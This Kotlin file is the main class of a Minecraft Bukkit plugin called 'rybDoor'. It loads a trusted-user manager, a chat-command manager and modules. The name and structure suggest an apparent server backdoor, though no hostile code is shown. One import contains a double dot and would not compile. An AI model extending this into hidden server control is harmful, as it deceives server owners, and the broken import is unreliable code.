package de.rygelgaspar.rybdoor.rybDoor

import de.rygelgaspar.rybdoor.command._CommandRegistry
import de.rygelgaspar.rybdoor.manager.ChatCommandManager
import de.rygelgaspar.rybdoor.manager.TrustedUserManager
import de.rygelgaspar.rybdoor.module.ModuleManager
import de.rygelgaspar.rybdoor..utils.log
import org.bukkit.plugin.java.JavaPlugin

class rybDoor: JavaPlugin() {

    companion object {
        lateinit var instance: rybDoor
        var debug = true
    }

    override fun onLoad() {
        instance = this

        TrustedUserManager
        log("TrustedUserManager loaded")
    }

    override fun onEnable() {
        ChatCommandManager; log("ChatCommandManager Loaded")

        _CommandRegistry; log("Independent Commands Loaded")

        ModuleManager; log("Dependent Modules Loaded")
    }
}

val instance by lazy { rybDoor.instance }
